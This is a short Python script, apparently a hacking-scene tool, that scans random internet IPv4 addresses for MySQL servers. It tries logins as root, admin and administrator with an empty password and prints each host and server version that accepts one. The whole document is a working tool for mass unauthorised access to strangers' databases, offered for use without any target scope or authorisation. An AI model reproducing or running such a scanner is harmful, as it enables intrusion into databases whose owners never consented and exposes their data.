#!/usr/bin/env python
# No_Password MySQL login scanner.
#http://darkcode.ath.cx
#d3hydr8[at]gmail[dot]com

import MySQLdb, random, sys

def randip():
	
	A = random.randrange(255) + 1
	B = random.randrange(255) + 1
	C = random.randrange(255) + 1
	D = random.randrange(255) + 1
	ip = "%d.%d.%d.%d" % (A,B,C,D)
	return ip

def title():
	print "\n   d3hydr8[at]gmail[dot]com MySQL_default v1.0"
	print "-------------------------------------------------"
	
#Add or subract users here.
users = ["root","admin","administrator"]

if len(sys.argv) <= 1:
	title()
	print "\nUsage: mysql_default.py <how many to scan>\n"
	sys.exit(0)
	
title()
print "\n[+] Scanning:",sys.argv[1]
for x in xrange(int(sys.argv[1])):
	ip = randip()
	try:
		for u in users:
			#print "[+] Connecting:",ip," User:",u
			db = MySQLdb.connect(user = u, passwd = "", host = ip, connect_timeout=15)
			print "[+] Connected"
			print "[+] IP:",ip,"  User:",u
			print db.get_server_info()
			print "[+] Connection successful."
			db.close()
	except(MySQLdb.OperationalError), msg:
		#print "[-] Connections Closed"
		pass

 
